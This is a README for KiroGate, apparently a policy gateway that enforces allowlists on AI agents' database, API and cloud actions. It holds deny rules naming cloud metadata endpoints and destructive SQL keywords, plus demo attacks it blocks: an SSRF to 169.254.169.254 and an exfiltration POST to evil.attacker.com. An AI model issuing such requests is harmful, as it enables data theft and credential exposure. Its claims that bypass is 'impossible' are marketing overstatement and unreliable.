# KiroGate — Zero Trust Policy Gateway for AI Agents

> **Guardrails hope. KiroGate guarantees.**

KiroGate is a deterministic policy enforcement gateway that sits between AI agents and target systems (databases, APIs, cloud services). It inspects every action an agent wants to take, evaluates it against an immutable allowlist, and either permits or denies execution — in under 1 millisecond.

No LLM in the enforcement path. No probabilistic checks. Just code.

---

## Why KiroGate Exists

Every enterprise is deploying AI agents. Those agents need to access databases, APIs, and cloud resources. Today there's no control plane — agents either get full access or no access.

**The problem with guardrails:**

| | LLM Guardrails | KiroGate |
|---|---|---|
| Enforcement | Probabilistic (another LLM judges safety) | Deterministic (code-based allowlist) |
| Bypass risk | High — prompt injection can trick the guard | Zero — allowlist is code, not conversation |
| Latency | 200-800ms (LLM inference) | **0.036ms** (CPU evaluation) |
| Multi-agent | Each agent needs its own guardrail | One gateway for all agents |
| Audit trail | "The model said it looked OK" | `policy.json` rule X matched, correlation_id Y |
| Cost per 1M checks | $500-2000 (LLM API calls) | ~$0.50 (CPU compute) |

KiroGate doesn't replace guardrails — it complements them. Guardrails are Layer 1 (input filtering). KiroGate is Layer 3 (execution boundary). If the guardrail misses something, KiroGate catches it. Guaranteed.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    AI Agents (Any LLM)                        │
│  ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐            │
│  │GPT-4 │ │Claude│ │Ollama│ │Gemini│ │Custom│            │
│  └──┬───┘ └──┬───┘ └──┬───┘ └──┬───┘ └──┬───┘            │
│     └─────────┴─────────┴─────────┴─────────┘              │
│                         │                                    │
│              ┌──────────▼──────────┐                        │
│              │   KiroGate Gateway  │ ← Deterministic policy │
│              │                     │                        │
│              │  Auth → Schema →    │                        │
│              │  Policy → Egress →  │   policy.json          │
│              │  Quota → STS Mint → │   (immutable)          │
│              │  Execute → Filter → │                        │
│              │  Audit              │                        │
│              └──────────┬──────────┘                        │
│                         │                                    │
│              ┌──────────▼──────────┐                        │
│              │   Target Systems    │                        │
│              │  DB · APIs · Cloud  │                        │
│              └─────────────────────┘                        │
└─────────────────────────────────────────────────────────────┘
```

### Zero Trust Principles

- **Never trust, always verify** — every request goes through the full pipeline
- **Default deny** — nothing is allowed unless explicitly in the policy
- **Least privilege** — STS mints credentials scoped to exactly one action
- **No standing access** — credentials live for milliseconds, not minutes
- **Assume breach** — agents hold zero secrets; compromised agent = zero escalation
- **Full audit** — every decision is logged with correlation IDs

---

## Performance

Benchmarked on a single Python process (no GPU, no special hardware):

| Operation | Latency | Throughput |
|---|---|---|
| Token verification (HMAC-SHA256) | 0.020ms | 50,769/sec |
| Policy evaluation (ALLOW) | 0.010ms | 103,024/sec |
| Policy evaluation (DENY) | 0.003ms | 399,073/sec |
| **Full pipeline (auth + policy)** | **0.036ms** | **27,713/sec** |

### Scaling estimates

| Deployment | Configuration | Throughput |
|---|---|---|
| Single process | 1 worker | ~5,000 req/sec (with HTTP overhead) |
| Small | 4 workers, 1 server | ~20,000 req/sec |
| Medium | 8 workers, 1 server | ~40,000 req/sec |
| Large | 4 pods × 8 workers | ~160,000 req/sec |
| Platform | 10 pods × 16 workers | ~500,000+ req/sec |

The policy engine is pure CPU computation — no database, no network, no LLM inference. Scales linearly with cores.

---

## Microservices Architecture

KiroGate runs as 6 containerized services:

| Service | Port | Responsibility |
|---------|------|----------------|
| **Frontend** (Next.js) | 3000 | Dashboard UI — login, pipeline viz, demos |
| **Auth Service** (FastAPI) | 8001 | JWT authentication, SSO-ready |
| **Gateway** (FastAPI) | 8000 | Policy enforcement, STS mint, audit |
| **Agent Service** (FastAPI) | 8002 | LLM provider abstraction, demo scenarios |
| **PostgreSQL** | 5432 | Audit logs, user accounts |
| **Floci** (AWS emulator) | 4566 | STS credential minting (dev); real AWS in prod |

```
┌─────────────────────────────────────────────────────────┐
│                   Docker / AKS Cluster                    │
│                                                           │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐ │
│  │ Frontend │  │   Auth   │  │ Gateway  │  │ Agent  │ │
│  │  :3000   │  │  :8001   │  │  :8000   │  │ :8002  │ │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └───┬────┘ │
│       │              │              │             │       │
│       └──────────────┼──────────────┼─────────────┘       │
│                      │              │                     │
│              ┌───────▼──────┐  ┌────▼─────┐             │
│              │  PostgreSQL  │  │  Floci   │             │
│              │    :5432     │  │  :4566   │             │
│              └──────────────┘  └──────────┘             │
└─────────────────────────────────────────────────────────┘
```

---

## Quick Start

### Run locally with Docker (one command):

```bash
docker compose up --build
```

Open http://localhost:3000 and login:
- **Workspace:** kirogate
- **Email:** admin@kirogate.dev
- **Password:** kirogate-demo

### Run without Docker (development):

```powershell
# Terminal 1 — Backend
$env:KIROGATE_AGENT_TOKEN="test-token"
python -m uvicorn kirogate.main:app --port 8000 --reload

# Terminal 2 — Frontend
cd frontend
npm install
npm run dev
```

---

## How Policy Works

The policy is a JSON allowlist loaded at startup. It directly maps to MCP `tools/call` requests:

```json
{
  "version": 1,
  "default": "deny",
  "tools": {
    "db.query": {
      "allow": true,
      "operations": ["select"],
      "tables": ["customers", "orders", "products"],
      "deny_keywords": ["DROP", "DELETE", "UPDATE", "INSERT"],
      "destination_whitelist": [],
      "deny_destinations": [],
      "aws_role": "arn:aws:iam::123456789012:role/KiroGate-DBQuery"
    },
    "http.post": {
      "allow": true,
      "destination_whitelist": ["https://api.example.com"],
      "deny_destinations": ["169.254.169.254", "metadata.google.internal"]
    }
  }
}
```

### What gets checked on every request:

1. **Authentication** — Bearer token verified (HMAC constant-time)
2. **Schema validation** — JSON-RPC 2.0 envelope valid
3. **Policy evaluation** — tool allowed? operation permitted? keywords blocked?
4. **Egress control** — destination in allowlist? not in deny list?
5. **Quota check** — within rate limits?
6. **STS mint** — short-lived credentials (15min TTL, actual use: milliseconds)
7. **Execute** — action performed with scoped credentials
8. **Response filter** — redact PII (SSN, passwords, tokens)
9. **Credential discard** — memory zeroed immediately
10. **Audit** — append-only log with correlation ID

If any step fails → **DENIED. Pipeline halted. No execution. No credentials minted.**

---

## Live Demo Scenarios

The system includes 4 real scenarios demonstrating enforcement:

| # | Scenario | Agent Action | Outcome | Blocked At |
|---|----------|--------------|---------|------------|
| 1 | Read Customers | `SELECT name, email, ssn FROM customers` | ✅ ALLOWED | — (SSN redacted in response) |
| 2 | Delete Records | `DELETE FROM customers WHERE ...` | ❌ DENIED | Policy Eval |
| 3 | SSRF Attack | `GET http://169.254.169.254/meta-data/` | ❌ DENIED | Egress Control |
| 4 | Data Exfiltration | `POST https://evil.attacker.com/collect` | ❌ DENIED | Egress Control |

These run against a real SQLite database with real LLM-generated queries (Ollama, OpenAI, or mock).

---

## LLM Provider (Pluggable)

The agent service supports any LLM provider via a simple protocol:

```bash
# Local (Ollama)
LLM_PROVIDER=ollama
OLLAMA_MODEL=llama3.2

# Cloud
LLM_PROVIDER=openai
OPENAI_API_KEY=sk-...

# Or
LLM_PROVIDER=anthropic
ANTHROPIC_API_KEY=sk-ant-...

# Custom microservice
LLM_PROVIDER=microservice
LLM_SERVICE_URL=http://your-model:8001

# No LLM needed for demos
LLM_PROVIDER=mock
```

KiroGate doesn't care what generates the intent. The policy enforcement is deterministic regardless of which LLM is used.

---

## Deploy to AKS

```powershell
# Build images
$env:CONTAINER_REGISTRY = "kirogate.azurecr.io"
./deploy.ps1 build

# Push to registry
./deploy.ps1 push

# Deploy to AKS
./deploy.ps1 aks
```

The gateway auto-scales from 2 to 20 pods based on CPU utilization (HPA configured at 70%).

### Production: Switch from Floci to Real AWS

```yaml
# Remove these env vars from gateway:
AWS_ENDPOINT_URL: http://floci:4566  # ← delete this line

# Use IAM role on the pod (IRSA) — no keys needed
# Or set real credentials in Kubernetes secrets
```

---

## Auth Service (SSO-Ready)

The auth service uses a provider protocol. To switch to SSO:

```python
# Current: local credential check
class LocalAuthProvider:
    def authenticate(self, workspace, email, password) -> UserInfo | None: ...

# Future: implement the same interface for OIDC
class OIDCProvider:
    def authenticate(self, workspace, email, password) -> UserInfo | None: ...
    def validate_sso_token(self, token) -> UserInfo | None: ...
```

Swap the provider in `auth_service/router.py` — no other code changes needed.

---

## Project Structure

```
MCPGate/
├── docker-compose.yml          # One command: docker compose up --build
├── deploy.ps1                  # Deploy: local / build / push / aks
├── policy.json                 # Immutable policy (the source of truth)
├── pyproject.toml              # Python dependencies
│
├── services/                   # Docker build contexts
│   ├── frontend/Dockerfile
│   ├── auth/Dockerfile
│   ├── gateway/Dockerfile
│   ├── agent/Dockerfile
│   └── postgres/init.sql
│
├── k8s/                        # Kubernetes manifests (AKS)
│   ├── namespace.yaml
│   ├── secrets.yaml
│   ├── gateway-deployment.yaml # 3 replicas + HPA
│   ├── auth-deployment.yaml
│   ├── frontend-deployment.yaml
│   └── ingress.yaml            # NGINX + TLS
│
├── frontend/                   # Next.js 14 dashboard
│   └── src/
│       ├── app/                # Pages (login, dashboard, demos, audit)
│       ├── components/         # Sidebar, shared UI
│       ├── lib/                # API client, auth helpers
│       └── middleware.ts       # Runtime service routing
│
├── src/kirogate/               # Python source
│   ├── main.py                 # Monolith app (dev mode)
│   ├── services/               # Microservice entry points
│   ├── auth_service/           # JWT + pluggable providers
│   ├── dashboard_api/          # REST API + live pipeline stats
│   ├── live_demo/              # LLM providers + scenarios + SQLite
│   ├── policy.py               # Policy evaluator
│   ├── sts_broker.py           # AWS STS credential minting
│   ├── egress.py               # Egress control (allowlist/denylist)
│   ├── filter.py               # Response PII redaction
│   ├── audit.py                # Append-only audit logger
│   └── session.py              # Quota management
│
└── tests/                      # 218 passing tests
```

---

## Tech Stack

| Component | Technology | Why |
|-----------|-----------|-----|
| Gateway | Python 3.13 + FastAPI | Fast iteration, async I/O, type-safe |
| Frontend | Next.js 14 + Tailwind | Dark theme dashboard, SSR-ready |
| Database | PostgreSQL 16 | Audit trail, user accounts |
| Credential Minting | AWS STS | Per-request, downscoped, 15min TTL |
| Local AWS Testing | Floci | Free, fast (53ms cold start), 45+ services |
| LLM Integration | Ollama / OpenAI / Anthropic | Pluggable, any provider |
| Container Runtime | Docker + Kubernetes | Production-ready, auto-scaling |
| Tests | pytest (218 tests) | Full coverage of enforcement pipeline |

---

## Who Is This For

| Buyer | Pain Point | KiroGate Solution |
|-------|-----------|-------------------|
| **CISO** | "AI agents will be our next breach" | Zero Trust enforcement, full audit trail |
| **Platform Engineering** | "Need governance for internal AI tools" | One gateway, per-agent policies |
| **Compliance** | "How do I prove AI agents aren't accessing restricted data?" | Deterministic decisions, correlation IDs, SOC2-compatible logs |
| **AI Engineers** | "Security team keeps blocking our agent deployments" | Ship agents with guardrails the security team trusts |

---

## KiroGate vs Alternatives

| | KiroGate | NeMo Guardrails | Lakera Guard | Custom IAM |
|---|---|---|---|---|
| Enforcement | Deterministic (code) | Probabilistic (LLM) | Probabilistic (classifier) | Static permissions |
| Latency | 0.036ms | 200-800ms | 50-200ms | 0ms (no check) |
| Per-request credentials | ✅ | ❌ | ❌ | ❌ |
| Multi-agent policy | ✅ | ❌ | ❌ | Manual |
| Response filtering | ✅ (PII redaction) | ❌ | ❌ | ❌ |
| Audit trail | ✅ (correlation IDs) | Partial | Partial | CloudTrail |
| Bypass via prompt injection | Impossible | Possible | Possible | N/A |

---

## Contributing

```bash
# Setup
pip install -e ".[dev]"
export KIROGATE_AGENT_TOKEN=test-token

# Run tests
pytest tests/ -x -q

# Run locally
python -m uvicorn kirogate.main:app --port 8000 --reload
```

---

## License

MIT
